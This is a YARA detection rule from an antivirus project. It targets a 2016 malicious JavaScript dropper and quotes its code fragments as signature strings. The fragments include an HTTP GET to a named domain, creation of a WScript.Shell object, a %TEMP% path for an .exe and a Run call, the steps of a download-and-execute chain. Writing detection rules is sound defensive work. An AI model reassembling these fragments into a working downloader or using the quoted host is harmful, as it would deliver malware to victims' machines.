rule sig_20160330_217f5e30ad267a5fa7f30cc3e3e99edd {
  meta:
    description = "datamaliciousorder - file 20160330_217f5e30ad267a5fa7f30cc3e3e99edd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5d6a54bb4ac2dcff0687579669d6168fccde3e373dc7134be3aaa51adb32daaa"

  strings:
    $s1  = "IA[DR](\"GET\", \"http://aaacollectionsjewelry.com/x9djsa\", false);" fullword ascii
    $s2  = "function C(DU0, VW){S = S * 1; return DU0 - VW;};" fullword ascii
    $s3  = "var HC = function I() {return WScript[N](\"WScript\"+\".Shell\");}(), YL = 11;" fullword ascii
    $s4  = "if (IA[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function JN() {return HC[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"WGw6yCD6of21bd.ex\" + \"e\";};" fullword ascii
    $s6  = "function V(){return OG + \"\";};" fullword ascii
    $s7  = "function G() {return ((R == true) && (R == KH)) ? 1 : S;};" fullword ascii
    $s8  = "function Z(XC){HC[\"Run\"](XC, S, S);};" fullword ascii
    $s9  = "function A()" fullword ascii
    $s10 = "function P(){return 22;};" fullword ascii
    $s11 = "function K(){return N;};" fullword ascii
    $s12 = "}while (DW);" fullword ascii
    $s13 = "var BH = new this[\"Date\"]();" fullword ascii
    $s14 = "function IZ(EY) {var SL = (1, 2, 3, 4, 5, EY); return SL;};" fullword ascii
    $s15 = "return C(DU, TV);" fullword ascii
    $s16 = "var UP = false;" fullword ascii
    $s17 = "var KH = false;" fullword ascii
    $s18 = "KH = true; " fullword ascii
    $s19 = "} catch(QS){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}